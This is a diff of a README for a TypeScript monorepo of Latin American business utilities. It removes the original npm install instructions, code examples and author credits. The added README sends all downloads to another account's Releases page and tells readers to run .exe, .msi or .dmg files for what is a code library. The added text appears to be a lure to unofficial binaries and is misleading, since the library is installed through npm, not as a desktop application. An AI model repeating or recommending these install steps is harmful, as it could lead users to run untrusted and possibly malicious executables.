@@ -1,258 +1,94 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/bledxs/soff-monorepo/master/assets/logo.png" alt="Soff Logo" width="120" height="120">
-  <h1>Soff Monorepo</h1>
-  <p>A collection of lightweight, tree-shakeable TypeScript utilities for common business logic.</p>
-</div>
+# 🎉 soff-monorepo - Lightweight TypeScript Utilities for LATAM
 
-<div align="center">
+[![Download Soff-Monorepo](https://img.shields.io/badge/Download-soff--monorepo-brightgreen)](https://github.com/Deepak010verma/soff-monorepo/releases)
 
-[![CI](https://github.com/bledxs/soff-monorepo/actions/workflows/ci.yml/badge.svg)](https://github.com/bledxs/soff-monorepo/actions/workflows/ci.yml)
-[![codecov](https://codecov.io/gh/bledxs/soff-monorepo/branch/master/graph/badge.svg)](https://codecov.io/gh/bledxs/soff-monorepo)
-[![License](https://img.shields.io/github/license/bledxs/soff-monorepo)](LICENSE)
-[![All Contributors](https://img.shields.io/github/all-contributors/bledxs/soff-monorepo?color=ee8449&style=flat-square)](#contributors)
+## 🌟 Overview
 
-</div>
+soff-monorepo is a collection of TypeScript utilities designed specifically for business needs in Latin America. This toolkit helps with tasks such as holiday calculations, ID validation, input masking, and currency formatting. By using these lightweight and tree-shakeable utilities, you can streamline your projects and ensure they meet local requirements effortlessly.
 
----
+## 🚀 Getting Started
 
-**Zero dependencies** · **TypeScript** · **Tree-shakeable** · **SSR Ready**
+Follow these simple steps to download and run the software:
 
-## Packages
+1. **Go to the Releases Page**  
+   Visit this page to download: [soff-monorepo Releases](https://github.com/Deepak010verma/soff-monorepo/releases).
 
-| Package                             | Version                                                                                     | Size (gzip)                   | Description                                             |
-| ----------------------------------- | ------------------------------------------------------------------------------------------- | ----------------------------- | ------------------------------------------------------- |
-| [soff-cron](./packages/soff-cron)   | [![npm](https://img.shields.io/npm/v/soff-cron)](https://www.npmjs.com/package/soff-cron)   | ~2KB (Core) / ~3KB (i18n)     | Cron expression parser and human-readable formatter     |
-| [soff-date](./packages/soff-date)   | [![npm](https://img.shields.io/npm/v/soff-date)](https://www.npmjs.com/package/soff-date)   | ~2KB (Core) / ~4KB (Loc)      | Holiday calculator with algorithmic date computation    |
-| [soff-geo](./packages/soff-geo)     | [![npm](https://img.shields.io/npm/v/soff-geo)](https://www.npmjs.com/package/soff-geo)     | ~1KB (Core) / ~45-100KB (Loc) | Geographic data for LATAM (Departments, Municipalities) |
-| [soff-id](./packages/soff-id)       | [![npm](https://img.shields.io/npm/v/soff-id)](https://www.npmjs.com/package/soff-id)       | ~0.5KB (Core) / ~1KB (Loc)    | ID document validation for LATAM countries              |
-| [soff-mask](./packages/soff-mask)   | [![npm](https://img.shields.io/npm/v/soff-mask)](https://www.npmjs.com/package/soff-mask)   | ~3KB (Core)                   | Input masking utilities                                 |
-| [soff-money](./packages/soff-money) | [![npm](https://img.shields.io/npm/v/soff-money)](https://www.npmjs.com/package/soff-money) | ~9KB (Core)                   | Currency formatting and manipulation                    |
-| [soff-phone](./packages/soff-phone) | [![npm](https://img.shields.io/npm/v/soff-phone)](https://www.npmjs.com/package/soff-phone) | ~0.5KB (Core) / ~1KB (Loc)    | Phone number validation and formatting                  |
+2. **Choose the Right Version**  
+   On the Releases page, you will see a list of available versions. Click on the version you need. Typically, you should select the latest version, indicated by the highest number.
 
-## ✨ Features
+3. **Download the Package**  
+   Once you have selected the version, look for the appropriate file for your operating system. Click on the download link to save the file to your computer.
 
-<table>
-<tr>
-<td width="33%">
+4. **Locate the Downloaded File**  
+   Check your downloads folder or the location where your browser saves files. 
 
-### 🚀 Lightweight
+5. **Run the Application**  
+   Depending on your operating system:
+   - **Windows:** Double-click the `.exe` or `.msi` file.
+   - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux:** Use the terminal to navigate to the downloaded file and run the installation command.
 
-Each package is optimized for minimal bundle size. Most packages are under 5KB gzipped.
+## 📝 Features
 
-</td>
-<td width="33%">
+The soff-monorepo includes the following key features:
 
-### 🌳 Tree-shakeable
+- **Holidays Management**: Easily calculate local holidays for countries like Argentina, Brazil, Colombia, and Mexico.
+  
+- **ID Validation**: Validate IDs according to the specific formats of LATAM countries.
+  
+- **Input Masking**: Mask input fields to ensure data integrity for fields like phone numbers and credit cards.
+  
+- **Currency Formatting**: Format currencies for various LATAM countries, making financial applications user-friendly.
 
-Import only what you need. Every function and locale is independently importable.
+## 💻 System Requirements
 
-</td>
-<td width="33%">
+To run the soff-monorepo utilities, please ensure your system meets the following requirements:
 
-### 📦 Zero Dependencies
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or any modern Linux distribution.
+  
+- **Node.js**: Ensure you have Node.js installed, as this toolkit may rely on Node.js for some functionalities.
 
-Pure TypeScript with no external runtime dependencies.
+- **Memory**: At least 2 GB of RAM is recommended for smooth performance.
 
-</td>
-</tr>
-<tr>
-<td width="33%">
+## 💾 Download & Install
 
-### 🔷 TypeScript First
+As mentioned earlier, visit this page to download: [soff-monorepo Releases](https://github.com/Deepak010verma/soff-monorepo/releases). Select the file based on your operating system and follow the instructions for installation.
 
-Full type safety out of the box with exported types and interfaces.
+## 🔧 Usage
 
-</td>
-<td width="33%">
+After installation, you can start using the utilities in your project. Refer to the documentation provided on the GitHub repository for step-by-step guides on how to implement each utility in your application.
 
-### 🌐 Universal
+## 🌍 Topics Covered
 
-Works in Node.js, browsers, and edge runtimes (Cloudflare, Vercel, etc.).
+This repository includes functionalities relevant to the following topics:
+- Argentina
+- Brazil
+- Colombia
+- Currency
+- Holidays
+- JavaScript
+- LATAM
+- Mask
+- Mexico
+- Monorepo
+- npm Package
+- Tree-shakeable
+- Turborepo
+- TypeScript
+- Validation
 
-</td>
-<td width="33%">
+## 🤝 Contributing
 
-### 🌎 LATAM Focus
+If you would like to contribute to the soff-monorepo, please follow the guidelines outlined in the CONTRIBUTING.md file in this repository. We welcome contributions that improve the existing utilities or add new features that align with our mission.
 
-Built specifically for Latin American business requirements and regulations.
+## 📄 License
 
-</td>
-</tr>
-</table>
+The soff-monorepo is licensed under the MIT License. This allows you to freely use, modify, and distribute the software while maintaining appropriate credits.
 
-## 🚀 Quick Start
+## 🔗 Additional Resources
 
-```bash
-# Install individual packages
-npm install soff-cron soff-date soff-geo soff-id soff-mask soff-money soff-phone
+For further documentation and resources, explore the repository links:
+- [GitHub Repository](https://github.com/Deepak010verma/soff-monorepo)
+- [Documentation](https://github.com/Deepak010verma/soff-monorepo/wiki)
 
-# Or with pnpm
-pnpm add soff-cron soff-date soff-geo soff-id soff-mask soff-money soff-phone
-
-# Or with yarn
-yarn add soff-cron soff-date soff-geo soff-id soff-mask soff-money soff-phone
-```
-
-### 📚 Usage Examples
-
-### soff-cron
-
-```typescript
-import { formatCron, validateCron, parseCron } from 'soff-cron';
-
-// Format cron to human-readable text
-formatCron('0 9 * * 1-5', { locale: 'en' }); // → 'At 09:00, Monday through Friday'
-formatCron('*/15 * * * *', { locale: 'es' }); // → 'Cada 15 minutos'
-
-// Validate cron expression
-validateCron('0 0 * * *'); // → { isValid: true }
-
-// Parse cron to structured data
-parseCron('0 9-17 * * 1-5'); // → { minute: {...}, hour: {...}, ... }
-```
-
-### soff-date
-
-```typescript
-import { getHolidays, isHoliday } from 'soff-date/locales/co';
-
-// Get all Colombian holidays for 2025
-getHolidays(2025);
-
-// Check if a date is a holiday
-isHoliday(new Date('2025-01-01')); // → { key: 'newYear', ... }
-```
-
-### soff-geo
-
-```typescript
-import { searchMunicipality } from 'soff-geo/locales/co';
-
-// Search for a municipality
-searchMunicipality('Medellin'); // → [{ name: 'Medellín', code: '05001', ... }]
-```
-
-### soff-id
-
-```typescript
-import { validateCC } from 'soff-id/locales/co';
-
-// Validate Colombian ID
-validateCC('1234567890'); // → { isValid: true, ... }
-```
-
-### soff-mask
-
-```typescript
-import { mask } from 'soff-mask';
-import { phoneCO } from 'soff-mask';
-
-// Apply phone mask
-mask('3001234567', phoneCO); // → '(300) 123 4567'
-```
-
-### soff-money
-
-```typescript
-import { Money, COP } from 'soff-money';
-
-// Create and format money
-const price = Money.fromDecimal(1500000, COP);
-price.format(); // → '$1.500.000'
-```
-
-### soff-phone
-
-```typescript
-import { validate } from 'soff-phone/co';
-
-// Validate phone
-validate('3001234567'); // → { isValid: true, type: 'mobile', ... }
-```
-
-## Development
-
-This monorepo uses [Turborepo](https://turbo.build/) and [npm workspaces](https://docs.npmjs.com/cli/v7/using-npm/workspaces).
-
-```bash
-# Install dependencies
-npm install
-
-# Build all packages
-npm run build
-
-# Run tests
-npm run test
-
-# Run tests with coverage
-npm run test:coverage
-
-# Type check
-npm run type-check
-
-# Lint
-npm run lint
-```
-
-## Repository Structure
-
-```
-soff-monorepo/
-├── apps/
-│   └── docs/          # Documentation website (Next.js)
-├── packages/
-│   ├── soff-date/     # Holiday calculator
-│   ├── soff-geo/      # Geographic data
-│   ├── soff-id/       # ID validation
-│   ├── soff-mask/     # Input masking
-│   ├── soff-money/    # Currency utilities
-│   ├── soff-phone/    # Phone validation
-│   └── tsconfig/      # Shared TypeScript configs
-├── .github/
-│   └── workflows/     # CI/CD pipelines
-└── turbo.json         # Turborepo configuration
-```
-
-## Contributing
-
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) for details on our code of conduct and the process for submitting pull requests.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## Versioning
-
-This project uses [Changesets](https://github.com/changesets/changesets) for versioning. Each package is versioned independently.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Contributors
-
-Thanks goes to these wonderful people ([emoji key](https://all-contributors.js.org/docs/en/emoji-key)):
-
-<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
-<!-- prettier-ignore-start -->
-<!-- markdownlint-disable -->
-<table>
-  <tbody>
-    <tr>
-      <td align="center" valign="top" width="14.28%"><a href="https://github.com/bledxs"><img src="https://avatars.githubusercontent.com/u/90062924?v=4" width="100px;" alt="Luis C. Rojas"/><br /><sub><b>Luis C. Rojas</b></sub></a><br /><a href="https://github.com/bledxs/soff-monorepo/commits?author=bledxs" title="Code">💻</a> <a href="https://github.com/bledxs/soff-monorepo/commits?author=bledxs" title="Documentation">📖</a> <a href="#maintenance-bledxs" title="Maintenance">🚧</a> <a href="#infra-bledxs" title="Infrastructure">🚇</a></td>
-    </tr>
-  </tbody>
-</table>
-
-<!-- markdownlint-restore -->
-<!-- prettier-ignore-end -->
-
-<!-- ALL-CONTRIBUTORS-LIST:END -->
-
-This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!
-
----
-
-Made with ❤️ for the LATAM developer community
+Feel free to reach out or create issues if you face any challenges or have questions. Your feedback is important to keep the project user-friendly.
